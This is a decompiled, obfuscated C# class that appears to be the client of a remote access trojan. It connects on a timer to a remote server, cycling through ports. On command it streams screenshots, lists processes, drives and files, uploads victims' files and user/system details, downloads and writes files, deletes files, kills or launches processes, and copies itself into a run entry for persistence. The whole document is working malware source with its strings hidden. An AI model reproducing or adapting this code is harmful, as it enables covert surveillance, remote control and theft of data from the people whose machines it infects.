using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace wardhmrias;

public class MLREDM
{
	public bool wardhmriasis_wodrking = false;

	private bool wardhmriasiswditch = false;

	private bool wardhmriasthrReuning = false;

	private bool wardhmriasstr_wdriter = false;

	private bool wardhmriascapdScreen = false;

	private Dictionary<string, byte[]> wardhmriastadsks = new Dictionary<string, byte[]>();

	public NetworkStream wardhmriasnetdStream;

	private int wardhmriasbufdfSize = 1024;

	private wardhmrias wardhmriasHdD = new wardhmrias();

	private int wardhmriasbytesrRead = 0;

	public bool wardhmriasreqtCnls = false;

	public bool wardhmriasautCnls = false;

	public DateTime wardhmriaslTimeiUtc;

	private Thread wardhmriasfundThread;

	private ELDRARE wardhmriasStateiObj = new ELDRARE();

	private MLRLEINF wardhmriasuitpC;

	private OLRDMR wardhmriasCMiD;

	private int wardhmriasscrfSize = 200;

	private ThreadStart wardhmriasfunStarter;

	public int port_sn = 0;

	public TcpClient wardhmriastcpsck;

	private MemoryStream msdStram = new MemoryStream();

	private SLCLRNS wardhmriascdaps = new SLCLRNS();

	private Bitmap image;

	public void wardhmriassavetFile(string filetPath)
	{
		try
		{
			byte[] array = wardhmriaspull_dfata();
			if (array != null)
			{
				File.WriteAllBytes(filetPath, array);
			}
		}
		catch
		{
		}
	}

	private void wardhmriassee_spyo()
	{
		if (!wardhmriasiswditch)
		{
			wardhmriasiswditch = true;
			wardhmriasnetdStream = wardhmriasCMiD.wardhmriasNdS(wardhmriastcpsck);
			wardhmriascapdScreen = false;
			while (wardhmriasis_wodrking)
			{
				string[] switchType = wardhmriasget_comdand();
				if (switchType != null)
				{
					wardhmriasreqtCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("wardhmrias-" + text) : ("wardhmrias-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "wardhmrias-putsrt":
					case "wardhmrias-puatsrt":
						wardhmriasload_atpp();
						break;
					case "wardhmrias-gedtavs":
					case "wardhmrias-gedatavs":
						wardhmriasfunStarter = delegate
						{
							wardhmriaslist_protsses("gedatavs");
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-thdumb":
					case "wardhmrias-thdaumb":
						wardhmriasimdage_intfo(switchType[1]);
						break;
					case "wardhmrias-procl":
					case "wardhmrias-praocl":
						wardhmriasfunStarter = delegate
						{
							wardhmriaslist_protsses("praocl");
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-filsz":
					case "wardhmrias-fialsz":
						wardhmriasfile_intfo(switchType[1]);
						break;
					case "wardhmrias-dodwf":
					case "wardhmrias-dodawf":
						wardhmriassavetFile(switchType[1]);
						break;
					case "wardhmrias-endpo":
					case "wardhmrias-enadpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "wardhmrias-rudpth":
					case "wardhmrias-rudapth":
						wardhmriaspush_dtata(null, "wardhmrias-apapth=|wardhmrias".Split(new char[1] { '|' })[0] + DLAONIF.wardhmriasget_mdpath());
						break;
					case "wardhmrias-scrsz":
					case "wardhmrias-scarsz":
						wardhmriasscredendrSize(switchType[1]);
						break;
					case "wardhmrias-dirs":
					case "wardhmrias-diars":
						wardhmriasfundThread = new Thread(wardhmriaslistDrivdes);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-stops":
					case "wardhmrias-staops":
						wardhmriascapdScreen = false;
						break;
					case "wardhmrias-csdcreen":
					case "wardhmrias-csdacreen":
						wardhmriassee_stgcren(switchType[1].ToString());
						break;
					case "wardhmrias-cnls":
					case "wardhmrias-cnals":
						wardhmriasautCnls = true;
						wardhmriasreqtCnls = true;
						wardhmriascapdScreen = false;
						break;
					case "wardhmrias-dowr":
					case "wardhmrias-doawr":
						wardhmriassavetFile(switchType[1]);
						break;
					case "wardhmrias-scren":
					case "wardhmrias-scaren":
						wardhmriascapdScreen = true;
						wardhmriasfunStarter = delegate
						{
							wardhmriasis_scrteen(switchType[1]);
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-fldr":
					case "wardhmrias-fladr":
					{
						string Folders = wardhmriasHdD.wardhmriascheck_Foldrers(switchType[1]);
						if (Folders != null)
						{
							wardhmriasfunStarter = delegate
							{
								wardhmriaspush_dtata(null, "wardhmrias-fladr=|wardhmrias".Split(new char[1] { '|' })[0] + Folders);
							};
							wardhmriasfundThread = new Thread(wardhmriasfunStarter);
							wardhmriasfundThread.Start();
						}
						break;
					}
					case "wardhmrias-udlt":
					case "wardhmrias-udalt":
						wardhmriasCMiD.wardhmriasremove_udser();
						break;
					case "wardhmrias-info":
					case "wardhmrias-inafo":
						wardhmriasfundThread = new Thread(wardhmriasuser_indfo);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-runf":
					case "wardhmrias-ruanf":
						wardhmriasCMiD.wardhmriasdo_prodess(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "wardhmrias-file":
					case "wardhmrias-fiale":
						wardhmriasfunStarter = delegate
						{
							wardhmriaspush_dfile(switchType[1]);
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-delt":
					case "wardhmrias-dealt":
						wardhmriasremove_dfile(switchType[1]);
						break;
					case "wardhmrias-fles":
					case "wardhmrias-flaes":
					{
						string files = wardhmriasHdD.wardhmriaslookup_Fidles(switchType[1]);
						if (files != null)
						{
							wardhmriasfunStarter = delegate
							{
								wardhmriaspush_dtata(null, "wardhmrias-flaes=|wardhmrias".Split(new char[1] { '|' })[0] + files);
							};
							wardhmriasfundThread = new Thread(wardhmriasfunStarter);
							wardhmriasfundThread.Start();
						}
						break;
					}
					case "wardhmrias-afile":
					case "wardhmrias-afaile":
						wardhmriasfunStarter = delegate
						{
							wardhmriassend_audto(switchType[1]);
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					case "wardhmrias-listf":
					case "wardhmrias-liastf":
						wardhmriasfunStarter = delegate
						{
							wardhmriasHdD.wardhmriaslook_Fides(switchType[1]);
						};
						wardhmriasfundThread = new Thread(wardhmriasfunStarter);
						wardhmriasfundThread.Start();
						break;
					}
					continue;
				}
				wardhmriasis_wodrking = false;
				break;
			}
			wardhmriasis_wodrking = false;
			wardhmriascapdScreen = false;
		}
		wardhmriasiswditch = false;
	}

	private bool wardhmriasIPSrFI()
	{
		try
		{
			DLAONIF.wardhmriasdefaudltP = wardhmriasCMiD.wardhmriasserverIPtD();
			wardhmriastcpsck = new TcpClient();
			wardhmriastcpsck.Connect(DLAONIF.wardhmriasdefaudltP, DLAONIF.wardhmriaspodrt);
			return true;
		}
		catch
		{
			wardhmriaspodrts_sdwitch();
			return false;
		}
	}

	public string wardhmriasfile_intfo(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|wardhmrias".Split(new char[1] { '|' })[0] : "<|wardhmrias".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|wardhmrias".Split(new char[1] { '|' })[0] : "<|wardhmrias".Split(new char[1] { '|' })[0]);
			text = text + wardhmriasget_dsize(fileInfo.Length) + ((!ret) ? ">|wardhmrias".Split(new char[1] { '|' })[0] : "<|wardhmrias".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				wardhmriaspush_dtata(null, "wardhmrias-fialsz=|wardhmrias".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void wardhmriasdo_stadrt()
	{
		DLAONIF.wardhmriaspodrt = DLAONIF.ports[0];
		wardhmriasuitpC = new MLRLEINF();
		wardhmriasCMiD = new OLRDMR(this);
		wardhmriasHdD.iservder = this;
		wardhmriasHdD.wardhmriasmaindPath = DLAONIF.wardhmriasget_mdpath();
		TimerCallback callback = wardhmriaslookup_codnr;
		Timer wardhmriastimer = new Timer(callback, wardhmriasStateiObj, 31280, 37420);
		wardhmriasStateiObj.wardhmriastimer = wardhmriastimer;
	}

	private void wardhmriaslookup_codnr(object ztource)
	{
		try
		{
			if (!wardhmriasthrReuning)
			{
				wardhmriasthrReuning = true;
				if (!wardhmriasis_wodrking || !wardhmriastcpsck.Connected)
				{
					wardhmriasis_wodrking = wardhmriasIPSrFI();
					if (wardhmriasis_wodrking)
					{
						wardhmriasbufdfSize = wardhmriastcpsck.ReceiveBufferSize;
						wardhmriassee_spyo();
					}
				}
			}
			wardhmriasthrReuning = false;
		}
		catch
		{
			wardhmriasthrReuning = false;
			wardhmriasstr_wdriter = false;
			wardhmriasis_wodrking = false;
			wardhmriasiswditch = false;
		}
	}

	public void wardhmriaspodrts_sdwitch()
	{
		try
		{
			port_sn++;
			DLAONIF.wardhmriaspodrt = DLAONIF.ports[port_sn];
			if (port_sn >= DLAONIF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool wardhmriassend_audto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				wardhmriaspush_dtata(data, "wardhmrias-afaile=" + fileinfo);
				return false;
			}
			wardhmriaspush_dtata(null, "wardhmrias-anafod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void wardhmriaslist_protsses(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|wardhmrias".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|wardhmrias".Split(new char[1] { '|' })[0];
				text += "0>|wardhmrias".Split(new char[1] { '|' })[0];
				text += "<";
			}
			if (text == "")
			{
				text = "No-Found!> > > <|wardhmrias".Split(new char[1] { '|' })[0];
			}
			byte[] bytedArray = DLAONIF.getBytedArray(text);
			wardhmriaspush_dtata(bytedArray, "wardhmrias-" + cmd + "=pcaess|wardhmrias".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void wardhmriasload_atpp()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasmaindApp + ".exe|wardhmrias".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			DLAONIF.wardhmriasset_rdun("duorb|wardhmrias".Split(new char[1] { '|' })[0], DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasmaindApp + ".exe|wardhmrias".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void wardhmriasimdage_intfo(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|wardhmrias".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|wardhmrias".Split(new char[1] { '|' })[0];
				text = text + wardhmriasget_dsize(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				wardhmriaspush_dtata(memoryStream.ToArray(), "wardhmrias-thaumb=|wardhmrias".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void wardhmriassee_stgcren(string screendSize)
	{
		try
		{
			wardhmriasscrfSize = Convert.ToInt16(screendSize.Split(new char[1] { '>' })[0].Trim());
			image = wardhmriascdaps.wardhmriasscreden(wardhmriasscrfSize);
			msdStram.SetLength(0L);
			((Image)image).Save((Stream)msdStram, ImageFormat.get_Jpeg());
			wardhmriaspush_dtata(msdStram.ToArray(), "wardhmrias-sascr=wardhmrias|wardhmrias".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void wardhmriasis_scrteen(string screendSize)
	{
		try
		{
			wardhmriasscrfSize = Convert.ToInt16(screendSize.Split(new char[1] { '>' })[0].Trim());
			while (wardhmriascapdScreen && wardhmriasis_wodrking)
			{
				image = wardhmriascdaps.wardhmriasscreden(wardhmriasscrfSize);
				msdStram.SetLength(0L);
				((Image)image).Save((Stream)msdStram, ImageFormat.get_Jpeg());
				wardhmriaspush_dtata(msdStram.ToArray(), "wardhmrias-scaren=wardhmrias|wardhmrias".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void wardhmriasuser_indfo()
	{
		string text = wardhmriasuitpC.wardhmriaslancdard + "|" + wardhmriasuitpC.wardhmriascnadme + "|" + wardhmriasuitpC.wardhmriasuntame + "|" + wardhmriasuitpC.wardhmriasuitp + "|" + DLAONIF.wardhmriasdOsname() + "|" + wardhmriasuitpC.wardhmriasaptyer + "|";
		text += "| !wardhmrias".Split(new char[1] { '!' })[0];
		text = text + "|" + wardhmriasuitpC.wardhmriasclientdNum;
		text = text + "|" + DLAONIF.wardhmriasget_mdpath();
		byte[] bytedArray = DLAONIF.getBytedArray(text);
		wardhmriaspush_dtata(bytedArray, "wardhmrias-inafo=uzaer|wardhmrias".Split(new char[1] { '|' })[0]);
	}

	private void wardhmriasscredendrSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			wardhmriasscrfSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public bool wardhmriaspush_dtata(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (wardhmriasstr_wdriter)
			{
				return false;
			}
			wardhmriasstr_wdriter = true;
			byte[] bytedArray = DLAONIF.getBytedArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(bytedArray.Length);
			byte[] array2 = new byte[num2 + bytedArray.Length + num];
			bytes.CopyTo(array2, 0);
			bytedArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytedArray.Length);
				data.CopyTo(array2, 10 + bytedArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !wardhmriasreqtCnls)
			{
				int num5 = ((num4 > wardhmriasbufdfSize) ? wardhmriasbufdfSize : num4);
				wardhmriasnetdStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			wardhmriasstr_wdriter = false;
			if (wardhmriasreqtCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			wardhmriasstr_wdriter = false;
			wardhmriasis_wodrking = false;
			return false;
		}
	}

	private string wardhmriasget_dsize(long byteCodunt)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|wardhmrias".Split(new char[1] { '|' })[0],
				"KB|wardhmrias".Split(new char[1] { '|' })[0],
				"MB|wardhmrias".Split(new char[1] { '|' })[0],
				"GB|wardhmrias".Split(new char[1] { '|' })[0],
				"TB|wardhmrias".Split(new char[1] { '|' })[0],
				"PB|wardhmrias".Split(new char[1] { '|' })[0],
				"EB|wardhmrias".Split(new char[1] { '|' })[0]
			};
			if (byteCodunt == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCodunt);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCodunt) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void wardhmriaspush_dfile(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				wardhmriaspush_dtata(File.ReadAllBytes(lfile), "wardhmrias-fiale=|wardhmrias".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void wardhmriasremove_dfile(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] wardhmriasget_comdand()
	{
		try
		{
			byte[] array = new byte[5];
			wardhmriasbytesrRead = wardhmriasnetdStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= wardhmriasbytesrRead)
			{
				int count = ((num3 > wardhmriasbufdfSize) ? wardhmriasbufdfSize : num3);
				wardhmriasbytesrRead = wardhmriasnetdStream.Read(array2, num2, count);
				num2 += wardhmriasbytesrRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			wardhmriasis_wodrking = false;
			return null;
		}
	}

	public byte[] wardhmriaspull_dfata()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			wardhmriasbytesrRead = wardhmriasnetdStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !wardhmriasreqtCnls)
			{
				int count = ((num3 > wardhmriasbufdfSize) ? wardhmriasbufdfSize : num3);
				wardhmriasbytesrRead = wardhmriasnetdStream.Read(array2, num, count);
				num += wardhmriasbytesrRead;
				num3 -= wardhmriasbytesrRead;
			}
			if (wardhmriasreqtCnls)
			{
				wardhmriasnetdStream.Flush();
				while (wardhmriasnetdStream.DataAvailable && wardhmriasnetdStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			wardhmriasis_wodrking = false;
			return null;
		}
	}

	private void wardhmriaslistDrivdes()
	{
		try
		{
			string text = wardhmriasHdD.wardhmriaslookup_Drtives();
			wardhmriaspush_dtata(null, "wardhmrias-diars=" + text);
		}
		catch
		{
		}
	}
}
